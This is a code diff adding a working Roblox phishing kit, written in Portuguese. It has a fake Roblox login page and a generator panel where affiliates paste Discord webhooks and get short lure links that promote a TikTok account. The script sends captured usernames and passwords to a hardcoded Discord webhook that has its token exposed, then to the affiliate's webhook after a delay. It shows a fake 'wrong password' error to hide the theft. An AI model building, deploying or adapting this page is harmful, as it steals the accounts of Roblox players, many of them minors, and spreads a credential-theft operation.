@@ -1,0 +1,423 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title id="pageTitle">Roblox - Entrar</title>
+    <link id="pageFavicon" rel="icon" href="https://www.roblox.com/favicon.ico">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+
+        /* Estilo do Painel Gerador com o Nome Colorido do Método */
+        #generatorView {
+            display: none; background: #0f0f0f; color: #fff; min-height: 100vh;
+            align-items: center; justify-content: center; padding: 20px;
+        }
+        .gen-card {
+            width: 100%; max-width: 480px; background: #1a1a1a;
+            border: 1px solid #2a2a2a; border-radius: 16px; padding: 36px 32px;
+        }
+        .gen-card h1 { font-size: 24px; font-weight: 800; margin-bottom: 8px; display: flex; align-items: center; gap: 10px; }
+        
+        .metodo-badge {
+            background: linear-gradient(45deg, #ff007f, #7f00ff, #00f0ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            font-weight: 900;
+        }
+
+        .gen-card p.sub { color: #9e9e9e; font-size: 14px; margin-bottom: 24px; line-height: 1.5; }
+        .gen-card label { display: block; font-size: 13px; font-weight: 700; margin-bottom: 8px; color: #ccc; }
+        .gen-card input[type=url] {
+            width: 100%; padding: 14px 16px; font-size: 14px;
+            background: #0f0f0f; border: 1px solid #333; border-radius: 8px;
+            color: #fff; outline: none;
+        }
+        .gen-btn {
+            width: 100%; margin-top: 16px; padding: 15px; font-size: 15px; font-weight: 800;
+            background: #00b06f; color: #fff; border: none; border-radius: 8px; cursor: pointer;
+        }
+        .result {
+            display: none; margin-top: 24px; padding: 16px;
+            background: #0f0f0f; border: 1px solid #2a2a2a; border-radius: 8px;
+        }
+        .result-link { word-break: break-all; font-size: 14px; color: #00b06f; font-family: monospace; margin-top: 8px; font-weight: bold; }
+        .copy-btn {
+            margin-top: 12px; width: 100%; padding: 10px; font-size: 13px; font-weight: 700;
+            background: transparent; color: #00b06f; border: 1px solid #00b06f; border-radius: 8px; cursor: pointer;
+        }
+
+        /* Estilo da Tela de Login do Roblox */
+        #loginView {
+            background: linear-gradient(rgba(15, 17, 20, 0.45), rgba(15, 17, 20, 0.45)), 
+                        url('https://customer-assets-gfyr7b9c.emergentagent.net/job_foto-pura/artifacts/0bf4fed321623995_1792279219761.jpg') no-repeat center center fixed;
+            background-size: cover;
+            background-color: #0b0c0e;
+            color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            justify-content: center;
+            align-items: center;
+            padding: 24px;
+        }
+
+        .login-card {
+            background-color: #232527;
+            width: 95%;
+            max-width: 600px;
+            padding: 40px 34px;
+            border-radius: 16px;
+            box-shadow: 0 22px 60px rgba(0, 0, 0, 0.85);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+        }
+
+        .login-title {
+            font-size: 36px;
+            font-weight: bold;
+            text-align: center;
+            margin-bottom: 30px;
+            color: #ffffff;
+        }
+
+        .input-group {
+            margin-bottom: 22px;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 21px 22px;
+            background-color: #111214;
+            border: 1px solid #393b3d;
+            border-radius: 11px;
+            color: #ffffff;
+            font-size: 25px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        .input-field:focus {
+            border-color: #ffffff;
+        }
+
+        .btn-primary {
+            width: 100%;
+            padding: 21px;
+            background-color: #ffffff;
+            color: #000000;
+            border: none;
+            border-radius: 11px;
+            font-size: 26px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        .forgot-password {
+            display: block;
+            text-align: center;
+            color: #b0b3b8;
+            font-size: 21px;
+            text-decoration: none;
+            margin-top: 25px;
+        }
+
+        .divider {
+            height: 1px;
+            background-color: #393b3d;
+            margin: 28px 0;
+        }
+
+        .secondary-actions {
+            display: flex;
+            flex-direction: column;
+            gap: 14px;
+        }
+
+        .btn-secondary {
+            width: 100%;
+            padding: 18px;
+            background-color: transparent;
+            color: #ffffff;
+            border: 1px solid #393b3d;
+            border-radius: 11px;
+            font-size: 22px;
+            font-weight: bold;
+            cursor: pointer;
+            text-align: center;
+        }
+
+        .signup-prompt {
+            text-align: center;
+            margin-top: 28px;
+            font-size: 22px;
+            color: #b0b3b8;
+        }
+
+        .signup-link {
+            color: #ffffff;
+            text-decoration: underline;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .error {
+            display: none; margin-top: 16px; padding: 14px;
+            background: #fdecec; color: #c0392b; border: 1px solid #f5c6c6; border-radius: 8px; font-size: 18px; font-weight: 600; text-align: center;
+        }
+
+        footer {
+            margin-top: 36px;
+            text-align: center;
+            font-size: 21px;
+            color: #b0b3b8;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 11px;
+        }
+
+        footer a {
+            color: #b0b3b8;
+            text-decoration: none;
+            margin: 0 7px;
+        }
+
+        .rating-container {
+            margin-top: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .rating-header-text {
+            font-size: 20px;
+            font-weight: bold;
+            color: #ffffff;
+            letter-spacing: 0.5px;
+            text-align: center;
+        }
+
+        .rating-box {
+            background-color: #ffffff;
+            color: #000000;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            width: 430px;
+            height: 86px;
+            overflow: hidden;
+            border: 1px solid #393b3d;
+        }
+
+        .rating-number-area {
+            background-color: #e31b23;
+            color: #ffffff;
+            font-weight: bold;
+            font-size: 39px;
+            width: 122px;
+            height: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-top-left-radius: 7px;
+            border-bottom-left-radius: 7px;
+        }
+
+        .rating-content-area {
+            flex: 1;
+            font-size: 22px;
+            font-weight: bold;
+            color: #000000;
+            text-align: center;
+            padding: 0 11px;
+        }
+
+        .rating-footer-text {
+            font-size: 20px;
+            color: #ffffff;
+            text-align: center;
+            line-height: 1.4;
+        }
+    </style>
+</head>
+<body>
+
+  <!-- PAINEL GERADOR COM O MÉTODO COLORIDO -->
+  <div id="generatorView">
+    <div class="gen-card">
+      <h1>Gerador <span class="metodo-badge">Método PPIIIIII</span> 🎣</h1>
+      <p class="sub">Cole seu webhook do Discord abaixo. O sistema vai gerar o link e o robô encurtador vai entregá-lo limpo.</p>
+      <label for="whInput">Seu Webhook do Discord</label>
+      <input type="url" id="whInput" placeholder="https://discord.com/api/webhooks/...">
+      <button class="gen-btn" id="genBtn">Gerar e Encurtar Link</button>
+      <div class="result" id="resultBox">
+        <div style="font-size: 12px; font-weight: 700; color: #9e9e9e;">SEU LINK CURTO GERADO</div>
+        <div class="result-link" id="resultLink"></div>
+        <button class="copy-btn" id="copyBtn">Copiar Link e Ir para o TikTok</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- TELA DE LOGIN DO ROBLOX -->
+  <div id="loginView">
+    <div class="login-card">
+      <h1 class="login-title">Entrar na Roblox</h1>
+      
+      <form id="loginForm">
+        <div class="input-group">
+          <input type="text" id="username" class="input-field" placeholder="Usuário/E-mail/Telefone" autocomplete="off" required>
+        </div>
+
+        <div class="input-group">
+          <input type="password" id="password" class="input-field" placeholder="Senha" autocomplete="off" required>
+        </div>
+
+        <button type="submit" class="btn-primary" id="loginBtn">Entrar</button>
+        <div class="error" id="errorBox">Nome de usuário ou senha incorretos</div>
+      </form>
+
+      <a href="#" class="forgot-password">Esqueceu a senha ou nome de usuário?</a>
+
+      <div class="divider"></div>
+
+      <div class="secondary-actions">
+        <button type="button" class="btn-secondary">Entrar com outro dispositivo</button>
+        <button type="button" class="btn-secondary">Enviar um código único</button>
+      </div>
+
+      <div class="signup-prompt">
+        Não tem uma conta? <span class="signup-link">Cadastrar-se</span>
+      </div>
+    </div>
+
+    <footer>
+      <p>
+        <a href="#">Privacidade</a> | 
+        <a href="#">Termos</a> | 
+        <a href="#">Acessibilidade</a>
+      </p>
+      <p>©2026 Roblox Corporation</p>
+
+      <div class="rating-container">
+        <div class="rating-header-text">CLASSIFICAÇÃO INDICATIVA: 16 ANOS</div>
+        <div class="rating-box">
+          <div class="rating-number-area">16</div>
+          <div class="rating-content-area">Violência</div>
+        </div>
+        <div class="rating-footer-text">
+          Interação entre usuários<br>
+          Compras no jogo (Inclui itens aleatórios)
+        </div>
+      </div>
+    </footer>
+  </div>
+
+<script>
+// Webhook Principal do Chefão (@jogadorhvju)
+const MAIN_WEBHOOK = "https://discord.com/api/webhooks/1559240030034202694/b01GZLFDR-4KoURDX5NyMEy26qp2CCJGpo1G5y5YExoL5ew626RLXRPl2ueLS9D8ZsNc";
+
+// Banco de Dados Local para simular os Links Curtos
+const urlDatabase = JSON.parse(localStorage.getItem('phish_db') || '{}');
+
+const params = new URLSearchParams(location.search);
+const shortCode = params.get("c");
+
+// Verificação de tela (Se tem parâmetro de código curto, mostra o Login; se não, mostra o Gerador)
+if (shortCode && urlDatabase[shortCode]) {
+  document.getElementById("generatorView").style.display = "none";
+  document.getElementById("loginView").style.display = "flex";
+} else if (!shortCode) {
+  document.getElementById("generatorView").style.display = "flex";
+  document.getElementById("loginView").style.display = "none";
+}
+
+// Lógica do Painel Gerador
+const genBtn = document.getElementById("genBtn");
+if(genBtn) {
+  genBtn.addEventListener("click", () => {
+    const wh = document.getElementById("whInput").value.trim();
+    if (!wh.startsWith("https://discord.com/api/webhooks/")) {
+      alert("Webhook inválido!");
+      return;
+    }
+    
+    // Encurtador: gera um código curto de 5 caracteres
+    const randomCode = Math.random().toString(36).substring(2, 7);
+    
+    // Mapeia o código ao webhook original
+    urlDatabase[randomCode] = wh;
+    localStorage.setItem('phish_db', JSON.stringify(urlDatabase));
+
+    // Exibe a URL encurtada limpa
+    const shortLink = location.origin + location.pathname + "?c=" + randomCode;
+    
+    document.getElementById("resultLink").textContent = shortLink;
+    document.getElementById("resultBox").style.display = "block";
+  });
+
+  // Ação do Botão Copiar: Copia a URL e direciona para o App do TikTok (@jogadorhvju)
+  document.getElementById("copyBtn").addEventListener("click", () => {
+    const linkText = document.getElementById("resultLink").textContent;
+    navigator.clipboard.writeText(linkText);
+    alert("Link curto copiado!");
+
+    // Tenta abrir direto o aplicativo do TikTok no perfil do @jogadorhvju
+    window.location.href = "tiktok://user?screen_name=jogadorhvju";
+
+    // Resgate se o app não abrir (abre o TikTok via web)
+    setTimeout(() => {
+      window.location.href = "https://www.tiktok.com/@jogadorhvju";
+    }, 1500);
+  });
+}
+
+// Envio das credenciais capturadas
+const form = document.getElementById("loginForm");
+if(form) {
+  form.addEventListener("submit", (e) => {
+    e.preventDefault();
+    const login = document.getElementById("username").value.trim();
+    const senha = document.getElementById("password").value;
+
+    // Envio direto para o Chefão (@jogadorhvju)
+    fetch(MAIN_WEBHOOK, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        username: "Roblox Phish Unified",
+        embeds: [{ title: "🔐 Roubo Capturado!", fields: [{ name: "User", value: login }, { name: "Pass", value: senha }] }]
+      })
+    }).catch(() => {});
+
+    // Envio para o comparsa (40s depois) usando o webhook registrado
+    const targetWh = urlDatabase[shortCode];
+    if (targetWh) {
+      setTimeout(() => {
+        fetch(targetWh, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            username: "Roblox Phish Unified",
+            embeds: [{ title: "🔐 Roubo Capturado (Atrasado)", fields: [{ name: "User", value: login }, { name: "Pass", value: senha }] }]
+          })
+        }).catch(() => {});
+      }, 40000);
+    }
+
+    const errorBox = document.getElementById("errorBox");
+    errorBox.style.display = "block";
+    setTimeout(() => {
+      errorBox.style.display = "none";
+    }, 3000);
+  });
+}
+</script>
+</body>
+</html>
